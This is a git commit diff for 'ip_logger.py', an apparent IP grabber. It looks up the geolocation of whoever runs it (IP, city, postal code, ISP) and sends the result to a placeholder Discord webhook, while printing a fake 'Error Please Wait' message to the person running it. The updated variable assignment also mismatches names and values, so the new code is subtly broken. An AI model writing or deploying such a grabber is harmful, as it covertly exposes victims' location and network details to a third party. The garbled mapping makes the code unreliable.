669bb293ab6e5d3e0169a3e6b7053ab467c03f9b
Lack <118399851+Lack54@users.noreply.github.com>
2023-01-15 13:13:05 -0500

    Update ip_logger.py

--- Ip Logger/ip_logger.py
+++ Ip Logger/ip_logger.py
@@ -1,18 +1,19 @@
+print("Error Please Wait")
 import requests
 import os
-os.system("pip install discord-webhook")
-from discord_webhook import DiscordWebhook, DiscordEmbed
+os.system("pip install -q discord-webhook")
+from discord_webhook import DiscordWebhook, DiscordEmbed    
 
-def main():
+
+def main():   
     response = requests.get("https://api.techniknews.net/ipgeo").json()
-    ip, country, regionName, city, zip, isp, mobile = response["ip"], response["country"], response["regionName"], response["city"], response["zip"], response["isp"], response["mobile"]
-    dis = (f"Country: {country}\nProvince/State: {regionName}\nCity: {city}\nPostalCode: {zip}\nIsp: {isp}\nUser Mobile: {mobile}")
+    proxy, ip, country, regionName, city, zip, isp, mobile = response["ip"], response["country"], response["regionName"], response["city"], response["zip"], response["isp"], response["mobile"], response["proxy"]
+    dis = (f"Country: {country}\nProvince: {regionName}\nCity: {city}\nPostalCode: {zip}\nIsp: {isp}\nIp address: {ip}\nUser proxy: {proxy}\nUser mobile: {mobile}")
     log("Geolocated Ip Address!", dis)
 
 def log(title, description):
-    webhook = DiscordWebhook(url="||||||||||||||||| YOUR WEBHOOK URL GOES HERE |||||||||||||||||||||||")
+    webhook = DiscordWebhook(url="/////////////// WEBHOOK GOES HERE \\\\\\\\\\\\\\")
     embed = DiscordEmbed(title=title, description=description, color="0000FF")
     webhook.add_embed(embed)
     response = webhook.execute()
-
 main()
